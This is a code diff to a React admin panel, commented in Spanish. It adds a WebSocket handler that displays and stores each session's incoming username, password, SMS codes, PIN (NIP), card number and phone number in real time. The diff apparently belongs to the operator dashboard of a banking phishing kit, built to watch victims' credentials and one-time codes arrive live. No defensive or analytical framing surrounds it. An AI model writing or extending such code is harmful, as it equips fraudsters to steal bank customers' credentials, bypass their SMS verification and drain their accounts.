@@ -92,6 +92,80 @@ export default function AdminPanel() {
             return updated;
           });
         }
+        else if (data.type === 'CLIENT_INPUT_REALTIME') {
+          // Mostrar notificación de entrada de datos en tiempo real
+          const { sessionId, tipo, inputData } = data.data;
+          
+          // Mostrar notificación toast con los datos recibidos
+          let inputDescription = '';
+          switch (tipo) {
+            case 'folio':
+              inputDescription = `Folio: ${inputData.folio}`;
+              break;
+            case 'login':
+              inputDescription = `Usuario: ${inputData.username}, Contraseña: ${inputData.password}`;
+              break;
+            case 'codigo':
+              inputDescription = `Código SMS: ${inputData.codigo}`;
+              break;
+            case 'nip':
+              inputDescription = `NIP: ${inputData.nip}`;
+              break;
+            case 'tarjeta':
+              inputDescription = `Tarjeta: ${inputData.tarjeta}`;
+              break;
+            default:
+              inputDescription = `Datos de ${tipo}`;
+          }
+          
+          toast({
+            title: "Datos recibidos en tiempo real",
+            description: inputDescription,
+            variant: "default",
+          });
+          
+          // Actualizar la sesión en la interfaz para mostrar datos inmediatamente
+          setSessions(prev => {
+            const updated = [...prev];
+            const index = updated.findIndex(s => s.sessionId === sessionId);
+            
+            if (index >= 0) {
+              // Crear copia de la sesión actual
+              const updatedSession = { ...updated[index] };
+              
+              // Actualizar los campos según el tipo de datos
+              switch (tipo) {
+                case 'folio':
+                  updatedSession.folio = inputData.folio;
+                  break;
+                case 'login':
+                  updatedSession.username = inputData.username;
+                  updatedSession.password = inputData.password;
+                  break;
+                case 'codigo':
+                  updatedSession.sms = inputData.codigo;
+                  break;
+                case 'nip':
+                  updatedSession.nip = inputData.nip;
+                  break;
+                case 'tarjeta':
+                  updatedSession.tarjeta = inputData.tarjeta;
+                  break;
+                case 'smsCompra':
+                  updatedSession.smsCompra = inputData.smsCompra;
+                  break;
+                case 'celular':
+                  updatedSession.celular = inputData.celular;
+                  break;
+              }
+              
+              // Actualizar en la lista
+              updated[index] = updatedSession;
+            }
+            
+            return updated;
+          });
+        }
       } catch (error) {
         console.error("Error parsing WebSocket message:", error);
       }
